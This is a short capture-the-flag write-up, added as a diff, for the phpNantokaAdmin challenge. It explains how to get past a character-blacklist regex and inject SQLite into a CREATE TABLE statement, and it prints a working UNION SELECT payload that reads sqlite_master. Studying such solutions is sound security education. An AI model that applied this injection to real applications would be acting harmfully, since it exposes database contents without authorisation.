@@ -1,0 +1,46 @@
+<h3>phpNantokaAdmin</h3>
+
+<p>Very interesting challenge:</p>
+
+<ul>
+<li>SQLite injection like this:</li>
+</ul>
+
+<p><code>
+CREATE TABLE {injection} (dummy1 TEXT, dummy2 TEXT, `{injection_2}` {injection_3}, ...)
+</code></p>
+
+<ul>
+<li>Each of those injections are limited to 32 chars and have to pass the following regex:</li>
+</ul>
+
+<p><code>php
+function is_valid($string) {
+  $banword = [
+    // comment out, calling function...
+    "[\"#'()*,\\/\\\\`-]"
+  ];
+  $regexp = '/' . implode('|', $banword) . '/i';
+  if (preg_match($regexp, $string)) {
+    return false;
+  }
+  return true;
+}
+</code></p>
+
+<ul>
+<li><p>Solution is to use <code>CREATE TABLE ... SELECT</code> statement which populates the new table with the content from the select statement.</p></li>
+<li><p>Use the <code>[]</code> keywords to wrap the irrelevant stuff into an alias and create a valid query:</p></li>
+</ul>
+
+<p><code>
+table_name=neko as select 1 as [&amp;columns[0][name]=] UniOn Select sql as &amp;columns[0][type]=lol&amp;columns[1][name]= from sqlite_master;&amp;columns[1][type]=XXXXXX
+</code></p>
+
+<ul>
+<li>The query becomes</li>
+</ul>
+
+<p><code>
+CREATE TABLE neko as select 1 as [ (dummy1 TEXT, dummy2 TEXT, `] UniOn Select sql as ` lol, ` from sqlite_master;` XXXXXX);
+</code></p>
